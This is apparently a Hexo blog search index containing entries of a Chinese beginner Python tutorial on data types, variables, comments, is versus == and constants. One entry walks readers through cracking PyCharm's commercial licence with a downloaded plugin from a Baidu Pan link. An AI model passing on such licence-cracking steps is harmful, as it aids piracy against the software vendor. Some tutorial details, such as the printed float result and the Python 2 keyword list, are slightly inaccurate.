<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>4.python基础数据类型初始</title>
      <link href="/2022/09/19/Python/4.python%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%88%9D%E8%AF%86/"/>
      <url>/2022/09/19/Python/4.python%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%88%9D%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="python基础数据类型初识"><a href="#python基础数据类型初识" class="headerlink" title="python基础数据类型初识"></a>python基础数据类型初识</h1><p>变量我们都知道是让计算机像我们人一祥都够记忆事物的某种状态,但是我们知道状态是有着不同种类,于是引出了</p><p>数据 类型, 通过不同的数据类型可以记录不同的状态。</p><h2 id="1-数字类型"><a href="#1-数字类型" class="headerlink" title="1. 数字类型"></a>1. 数字类型</h2><p>python中没有数字类型这一说,只是为了更好的学习,人为的把整型和浮点型统称为数字类型.</p><h3 id="1-1-int整型"><a href="#1-1-int整型" class="headerlink" title="1.1 int整型"></a>1.1 int整型</h3><h4 id="1-1-1作用"><a href="#1-1-1作用" class="headerlink" title="1.1.1作用"></a>1.1.1作用</h4><p>用来记录用整数记录的状态, 比如年份, 年龄 等</p><h4 id="1-1-1-定义"><a href="#1-1-1-定义" class="headerlink" title="1.1.1 定义"></a>1.1.1 定义</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">20</span></span><br><span class="line">year = <span class="number">1999</span></span><br></pre></td></tr></table></figure><h3 id="1-2-float浮点型"><a href="#1-2-float浮点型" class="headerlink" title="1.2 float浮点型"></a>1.2 float浮点型</h3><h4 id="1-2-1-作用"><a href="#1-2-1-作用" class="headerlink" title="1.2.1 作用"></a>1.2.1 作用</h4><p>用来记录用小数记录的状态，比如某些商品的价格，存款等</p><h4 id="1-2-2-定义"><a href="#1-2-2-定义" class="headerlink" title="1.2.2 定义"></a>1.2.2 定义</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">price = <span class="number">98.88</span></span><br><span class="line">money = <span class="number">3999.54</span></span><br></pre></td></tr></table></figure><h3 id="1-3-数字类型的使用"><a href="#1-3-数字类型的使用" class="headerlink" title="1.3 数字类型的使用"></a>1.3 数字类型的使用</h3><h4 id="1-3-1-数学运算"><a href="#1-3-1-数学运算" class="headerlink" title="1.3.1 数学运算"></a>1.3.1 数学运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">99</span></span><br><span class="line">b = <span class="number">1</span></span><br><span class="line">c = a + b</span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment"># 100</span></span><br></pre></td></tr></table></figure><h4 id="1-3-2-比较大小"><a href="#1-3-2-比较大小" class="headerlink" title="1.3.2 比较大小"></a>1.3.2 比较大小</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">100</span></span><br><span class="line">y = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y&gt;x) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><p>顺便提一嘴, float类型 可以和 int类型 做四则运算 结果都是 float类型 </p><p>注意:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">99.99</span></span><br><span class="line">y = <span class="number">0.01</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x+y) <span class="comment"># 100.00</span></span><br><span class="line"><span class="comment"># x + y == 100 False</span></span><br></pre></td></tr></table></figure><h2 id="2-字符串类型"><a href="#2-字符串类型" class="headerlink" title="2. 字符串类型"></a>2. 字符串类型</h2><h3 id="2-1-字符"><a href="#2-1-字符" class="headerlink" title="2.1 字符"></a>2.1 字符</h3><h4 id="2-1-1-什么是字符"><a href="#2-1-1-什么是字符" class="headerlink" title="2.1.1 什么是字符"></a>2.1.1 什么是字符</h4><p>字符是组成内容的最小单位, 比如’hello’ 他就是由5个英文字符组成的一个字符串,字符不只限于英文字符, 中文字符,数字字符都是字符.  </p><h3 id="2-2-字符串"><a href="#2-2-字符串" class="headerlink" title="2.2 字符串"></a>2.2 字符串</h3><h4 id="2-2-1-什么是字符串"><a href="#2-2-1-什么是字符串" class="headerlink" title="2.2.1 什么是字符串"></a>2.2.1 什么是字符串</h4><p>字符串就是由许多字符组成的一串内容</p><h4 id="2-2-2-作用"><a href="#2-2-2-作用" class="headerlink" title="2.2.2 作用"></a>2.2.2 作用</h4><p>字符串的作用是用来记录描述性质的状态</p><h4 id="2-2-3-定义字符串"><a href="#2-2-3-定义字符串" class="headerlink" title="2.2.3 定义字符串"></a>2.2.3 定义字符串</h4><p>用英文引号 （单引号、双引号、三引号）包含的一串字符。</p><ul><li><p>通过单引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;alex&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>通过双引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="string">&quot;18&quot;</span>  <span class="comment"># 注意这里是用引号包裹的,不是int类型,是str类型</span></span><br></pre></td></tr></table></figure></li><li><p>通过三引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hobby = <span class="string">&quot;&quot;&quot; 喝酒,抽烟</span></span><br><span class="line"><span class="string">烫头发 &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li></ul><p>单双引号没什么区别, 三引号有些特殊,可以换行显示</p><h4 id="2-2-4-字符串的嵌套"><a href="#2-2-4-字符串的嵌套" class="headerlink" title="2.2.4 字符串的嵌套"></a>2.2.4 字符串的嵌套</h4><p>注意: 字符串的嵌套只能发生在不同中引号之间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info = <span class="string">&quot;你好,我叫&#x27;山鸡&#x27;, 你也可以叫我小鸡 , 初次见面,多多关照&quot;</span> <span class="comment"># 双引号嵌套单引号</span></span><br></pre></td></tr></table></figure><p>字符串也可以<code>用+号连接</code>,但是不称之为是字符串相加 , 称它是字符串的拼接,只限于字符串和字符串 (效率低)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;hello &#x27;</span></span><br><span class="line">y = <span class="string">&#x27;word&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x + y) <span class="comment"># hello word</span></span><br></pre></td></tr></table></figure><p>字符串也可以和int类型用<code>*</code>号连接, 代表复制字符串int份</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;alex sb&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s*<span class="number">3</span>) <span class="comment"># &#x27;alex sbalex sbalex sb&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="3-列表类型"><a href="#3-列表类型" class="headerlink" title="3. 列表类型"></a>3. 列表类型</h2><h3 id="3-1-什么是列表"><a href="#3-1-什么是列表" class="headerlink" title="3.1 什么是列表"></a>3.1 什么是列表</h3><p>你可以把列表理解成一种容器 , 容器里面可以放很多值. 有人可能会说, 我字符串也可以放很多值啊, 为什么还要用列表呢? 我们都知道他们两个都可以存放很多值, 但是我们要知道, 值不单单只有存, 还要有取, 换句话来说, 你存值就肯定会取值, 如果你不取, 那存值将毫无意义. 列表相对于字符串的优点就是取值方便, 更利于我们操作.</p><p>列表是通过索引对应值, 索引从0开始, 0代表第一个.</p><h3 id="3-2-作用"><a href="#3-2-作用" class="headerlink" title="3.2 作用"></a>3.2 作用</h3><p>记录多个值 , 并且可以按照索引取到指定位置的值</p><h3 id="3-3-定义"><a href="#3-3-定义" class="headerlink" title="3.3 定义"></a>3.3 定义</h3><p>在 [ ] 内用逗号分隔开多个任意类型的值 , 每一个值称之为一个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span> ]</span><br><span class="line">索引:     <span class="number">0</span>    <span class="number">1</span>    <span class="number">2</span></span><br></pre></td></tr></table></figure><p>列表也可以嵌套列表,称之为二维列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lst = [ [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span>] , [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span>] , [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span>]]</span><br><span class="line">索引             <span class="number">0</span>                   <span class="number">1</span>                     <span class="number">2</span></span><br></pre></td></tr></table></figure><p><strong>提一嘴:</strong></p><p>列表在内存中的存储方式（基本上容器类型的数据都是这样在内存中存储的）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&#x27;Tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;烫头&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="string">&quot;Tom&quot;</span>的内存地址</span><br><span class="line"><span class="number">1</span>:<span class="number">18</span>的内存地址</span><br><span class="line"><span class="number">2</span>:<span class="string">&#x27;烫头&#x27;</span>的内存地址</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20200812180634069.png" alt="image-20200812180634069"></p><h2 id="4-字典类型"><a href="#4-字典类型" class="headerlink" title="4. 字典类型"></a>4. 字典类型</h2><h3 id="4-1-什么是字典"><a href="#4-1-什么是字典" class="headerlink" title="4.1 什么是字典"></a>4.1 什么是字典</h3><p>key对应值, 其中key通常为字符串类型, 所以key对值有描述性的功能</p><p>字典是无序的, 虽然你在pycharm中打印的结果虽然每次都一样, 在python中交互式中写代码也是,但是我们仍然把字典看成无序的,或者你这样理解,有序就有索引,就可以通过索引取值,但是字典不能通过索引取值,所以是无序的.</p><h3 id="4-2-作用"><a href="#4-2-作用" class="headerlink" title="4.2 作用"></a>4.2 作用</h3><p>用来存多个值, 每一个值都有一个唯一的key与其对应</p><h3 id="4-3-定义"><a href="#4-3-定义" class="headerlink" title="4.3 定义"></a>4.3 定义</h3><p>在 { } 内用逗号分隔开多个key :  value</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;alex&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="5-布尔类型"><a href="#5-布尔类型" class="headerlink" title="5. 布尔类型"></a>5. 布尔类型</h2><h3 id="5-1-作用"><a href="#5-1-作用" class="headerlink" title="5.1 作用"></a>5.1 作用</h3><p>用来记录真假的状态, 通常用来当做判断的条件</p><h3 id="5-2-定义"><a href="#5-2-定义" class="headerlink" title="5.2 定义"></a>5.2 定义</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_ok = <span class="literal">True</span>  <span class="comment">#真</span></span><br><span class="line">is_ok = <span class="literal">False</span> <span class="comment">#假</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.变量&amp;常量&amp;注释</title>
      <link href="/2022/09/19/Python/3.%E5%8F%98%E9%87%8F&amp;%E5%B8%B8%E9%87%8F&amp;%E6%B3%A8%E9%87%8A/"/>
      <url>/2022/09/19/Python/3.%E5%8F%98%E9%87%8F&amp;%E5%B8%B8%E9%87%8F&amp;%E6%B3%A8%E9%87%8A/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="注释-amp-变量-amp-常量"><a href="#注释-amp-变量-amp-常量" class="headerlink" title="注释&amp;变量&amp;常量"></a>注释&amp;变量&amp;常量</h2><h3 id="1-注释"><a href="#1-注释" class="headerlink" title="1.注释"></a>1.注释</h3><p>注释是对代码的解释说明，不是所有代码都需要注释，只是那些难于理解又关键的代码，必须加注释，方便自己或</p><p>其他人后期阅读。</p><p>注释的内容不会被python解释器，解释执行。</p><h4 id="1-1-注释的两种方式"><a href="#1-1-注释的两种方式" class="headerlink" title="1.1 注释的两种方式"></a>1.1 注释的两种方式</h4><p><strong>1.1.1 单行注释</strong></p><p>井号 + 注释内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我是一行注释</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello word&#x27;</span>) <span class="comment"># 我也是一行注释</span></span><br></pre></td></tr></table></figure><p><strong>1.1.2 多行注释</strong></p><p>三个单引号&#x2F;三个双引号  +  注释内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">我是</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">我也是</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2. 变量"></a>2. 变量</h3><h4 id="2-1-什么是变量？"><a href="#2-1-什么是变量？" class="headerlink" title="2.1 什么是变量？"></a>2.1 什么是变量？</h4><p>变量就是可以变化的量，这个量指的是事物的状态，比如说人的年龄，今天的天气啊，你的发量啊，哈哈哈。</p><p>在计算机中变量指的是内存中的一段空间</p><h4 id="2-2-为什么要有变量？"><a href="#2-2-为什么要有变量？" class="headerlink" title="2.2 为什么要有变量？"></a>2.2 为什么要有变量？</h4><p>为了让计算机能够像人一样去记忆事物的某种状态，并且状态是可以发生变化的。</p><p>详细地说：</p><p>程序执行的本质就是一系列状态的变化，变化是程序执行的直接体现，所以我们需要有一种机制能够反映或者说是</p><p>保存下来程序执行时状态，以及状态的变化。</p><h4 id="2-3-怎么使用变量？"><a href="#2-3-怎么使用变量？" class="headerlink" title="2.3 怎么使用变量？"></a>2.3 怎么使用变量？</h4><p><strong>变量一定是，先定义后使用。</strong></p><p>变量的三大组成部分，如下图</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20200803210523860.png" alt="image-20200803210523860"></p><p>解释器执行到变量定义的代码时会申请内存空间存放变量值，然后将变量值的内存地址绑定给变量名，以变量的定</p><p>义name &#x3D; “mhx”为例，如下图：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个变量</span></span><br><span class="line">name = <span class="string">&quot;mhx&quot;</span></span><br></pre></td></tr></table></figure><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20200803211316599.png" alt="image-20200803211316599" style="zoom:80%;"><p>这样我们就定义了一个变量，定义变量的本质就是申请在内存中开辟一块空间存放变量值，那之前我们说过，你既</p><p>然存在内存中，怎么取出来用呢？就是通过变量名，变量名指向的就是变量值存放的内存地址，我们可以拿着地址</p><p>去访问值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个变量</span></span><br><span class="line">name = <span class="string">&quot;ymn&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><h4 id="2-4-变量名的命名规范"><a href="#2-4-变量名的命名规范" class="headerlink" title="2.4 变量名的命名规范"></a>2.4 变量名的命名规范</h4><ul><li><p>变量名只能由 字母、数字、下划线 组成。</p></li><li><p>变量名不能以数字开头。</p></li><li><p>变量名不能是Python内置关键字，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">‘<span class="keyword">and</span>’, ‘<span class="keyword">as</span>’, ‘<span class="keyword">assert</span>’, ‘<span class="keyword">break</span>’, ‘<span class="keyword">class</span>’, ‘<span class="keyword">continue</span>’, ‘<span class="keyword">def</span>’, ‘<span class="keyword">del</span>’, ‘<span class="keyword">elif</span>’, ‘<span class="keyword">else</span>’, ‘<span class="keyword">except</span>’, ‘<span class="built_in">exec</span>’, ‘<span class="keyword">finally</span>’, ‘<span class="keyword">for</span>’, ‘<span class="keyword">from</span>’, ‘<span class="keyword">global</span>’, ‘<span class="keyword">if</span>’, ‘<span class="keyword">import</span>’, ‘<span class="keyword">in</span>’, ‘<span class="keyword">is</span>’, ‘<span class="keyword">lambda</span>’, ‘<span class="keyword">not</span>’, ‘<span class="keyword">or</span>’, ‘<span class="keyword">pass</span>’, ‘<span class="built_in">print</span>’, ‘<span class="keyword">raise</span>’, ‘<span class="keyword">return</span>’, ‘<span class="keyword">try</span>’, ‘<span class="keyword">while</span>’, ‘<span class="keyword">with</span>’, ‘<span class="keyword">yield</span>’</span><br><span class="line"></span><br><span class="line">可以通过</span><br><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(keyword.kwlist)    <span class="comment"># 打印所有的关键字</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>命名的两种风格</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 风格一：驼峰体</span></span><br><span class="line">AgeOfTony = <span class="number">56</span> </span><br><span class="line">NumberOfStudents = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 风格二：纯小写+下划线(在python中，变量名的命名推荐使用该风格)</span></span><br><span class="line">age_of_tony = <span class="number">56</span> </span><br><span class="line">number_of_students = <span class="number">80</span></span><br></pre></td></tr></table></figure><p><strong>变量名的不推荐命名</strong>（虽然程序不会报错，但是别人看到这样的命名一定会，呵呵的）</p><ul><li>采用拼音，用汉字命名，变量名过长，这些都是不推荐的，实际开发中，一定不要采用这种。</li></ul><h3 id="3-is-与-x3D-x3D"><a href="#3-is-与-x3D-x3D" class="headerlink" title="3. is 与 &#x3D;&#x3D;"></a>3. is 与 &#x3D;&#x3D;</h3><h4 id="3-1-id"><a href="#3-1-id" class="headerlink" title="3.1 id"></a>3.1 id</h4><p>之前我们讲到过变量名绑定的是变量值的内存地址，那么不同的变量名可能绑定的内存地址是不同的，那么怎么能</p><p>体现这一点呢？python解释器给我们提供了<strong>id（）</strong>这个函数。（函数后面会介绍）</p><p>通过<code>id(变量名)</code> 会返回一串id号码，这串id号码就对应着这个变量值的内存地址。那么我们就可以通过比较id号</p><p>码，来判断不同变量名指向的内存地址是否相同。id( )返回对象当前的内存地址，内存地址不同id自然不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;mhx&#x27;</span></span><br><span class="line">y = <span class="string">&#x27;alex&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(x))  <span class="comment"># 3102991623032</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(y))  <span class="comment"># 3102991623033</span></span><br></pre></td></tr></table></figure><h4 id="3-2-is"><a href="#3-2-is" class="headerlink" title="3.2 is"></a>3.2 is</h4><p>比较的是左右两边的id是否相等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;100&#x27;</span></span><br><span class="line">y = x</span><br><span class="line"><span class="built_in">print</span>(x <span class="keyword">is</span> y) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h4 id="3-3-x3D-x3D"><a href="#3-3-x3D-x3D" class="headerlink" title="3.3 &#x3D;&#x3D;"></a>3.3 &#x3D;&#x3D;</h4><p>比较的是左右两边的值是否相等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">y = <span class="string">&#x27;10&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x == y) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong> id相等，即内存地址必然相等，即值必然相等。但是值相等，但id不一定相等，内存地址也不一定相等。</p><h3 id="4-小整数池-了解"><a href="#4-小整数池-了解" class="headerlink" title="4. 小整数池 ( 了解 )"></a>4. 小整数池 ( 了解 )</h3><h4 id="4-1-什么是小整数池？"><a href="#4-1-什么是小整数池？" class="headerlink" title="4.1 什么是小整数池？"></a>4.1 什么是小整数池？</h4><p>就是当你的python解释器启动的那一刻，会在内存中事先申请好一系列的内存空间存在一些常用的整数。</p><p>这个整数的返回是【-5 , 256】。</p><h4 id="4-2-小整数池有什么用？"><a href="#4-2-小整数池有什么用？" class="headerlink" title="4.2 小整数池有什么用？"></a>4.2 小整数池有什么用？</h4><p>这样一些我们常用的小整数就不需要我们来回创建了，直接从小整数池中取。所以当你定一些变量如果它的值在小整数数据池中 , 那么他们的即使复制给不同的变量 , 也有可能内存地址相同</p><h3 id="5-常量"><a href="#5-常量" class="headerlink" title="5. 常量"></a>5. 常量</h3><h4 id="5-1-什么是常量？"><a href="#5-1-什么是常量？" class="headerlink" title="5.1 什么是常量？"></a>5.1 什么是常量？</h4><p>常量就是不变的量，但是在python中是没有常量概念的，人们约定俗成用全部大写的英文单词代表常量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NAME = <span class="string">&quot;我是一个常量&quot;</span></span><br></pre></td></tr></table></figure><h4 id="5-2-为什么要有常量？"><a href="#5-2-为什么要有常量？" class="headerlink" title="5.2 为什么要有常量？"></a>5.2 为什么要有常量？</h4><p>在程序运行过程中，有些值是固定的、不应该被改变，比如圆周率 3.141592653…</p><h4 id="5-3-怎么使用常量？"><a href="#5-3-怎么使用常量？" class="headerlink" title="5.3 怎么使用常量？"></a>5.3 怎么使用常量？</h4><p>在Python中没有一个专门的语法定义常量，约定俗成是用全部大写的变量名表示常量。如：PI&#x3D;3.14159。所以单</p><p>从语法层面去讲，常量的使用与变量完全一致。</p><p>重点理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.什么是变量</span><br><span class="line">2.什么是内存地址</span><br><span class="line">3.自己命名的变量要符合命名规范</span><br><span class="line">4.知道什么情况下使用常量</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.pycharm破解激活</title>
      <link href="/2022/09/19/Python/2.pycharm%E7%A0%B4%E8%A7%A3%E6%BF%80%E6%B4%BB/"/>
      <url>/2022/09/19/Python/2.pycharm%E7%A0%B4%E8%A7%A3%E6%BF%80%E6%B4%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><blockquote><p>破解激活</p></blockquote><p>参数解释</p><p>一些设置</p></blockquote><h2 id="1-下载文件"><a href="#1-下载文件" class="headerlink" title="1.下载文件"></a>1.下载文件</h2><p>链接：<a href="https://pan.baidu.com/s/1lzpMIw041W3vGvw4yP6Ixw">https://pan.baidu.com/s/1lzpMIw041W3vGvw4yP6Ixw</a> </p><p>提取码：trno</p><h2 id="2-安装pycharm"><a href="#2-安装pycharm" class="headerlink" title="2.安装pycharm"></a>2.安装pycharm</h2><p>下载好以后 , 双击<code>pycharm.exe</code> 下一步 , 下一步安装就好了 , 安装过程中需要勾选一个</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181031936.png" alt="image-20211023181031936"></p><p>然后打开pycharm </p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181136449.png" alt="image-20211023181136449"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181148518.png" alt="image-20211023181148518"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181203241.png" alt="image-20211023181203241"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181235072.png" alt="image-20211023181235072"></p><h2 id="3-激活"><a href="#3-激活" class="headerlink" title="3.激活"></a>3.激活</h2><p>创建项目</p><p><img src="https://img2020.cnblogs.com/blog/1894047/202008/1894047-20200803205632778-1385222234.png"></p><p>选择项目名和python解释器路径</p><p><img src="https://img2020.cnblogs.com/blog/1894047/202008/1894047-20200803205657979-1918507016.png"></p><p><img src="https://img2020.cnblogs.com/blog/1894047/202008/1894047-20200803205709781-1927743151.png"></p><p>然后进入pycharm , 把解压好的破解插件拖到pycharm中</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181657896.png" alt="image-20211023181657896"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181708947.png" alt="image-20211023181708947"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181723783.png" alt="image-20211023181723783"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181747891.png" alt="image-20211023181747891"></p><h2 id="4-查看激活信息"><a href="#4-查看激活信息" class="headerlink" title="4.查看激活信息"></a>4.查看激活信息</h2><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181840805.png" alt="image-20211023181840805"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023181822393.png" alt="image-20211023181822393"></p><p>已经激活到 2089年</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.python安装和pip换源</title>
      <link href="/2022/09/19/Python/1.python%E5%AE%89%E8%A3%85%E5%92%8Cpip%E6%8D%A2%E6%BA%90/"/>
      <url>/2022/09/19/Python/1.python%E5%AE%89%E8%A3%85%E5%92%8Cpip%E6%8D%A2%E6%BA%90/</url>
      
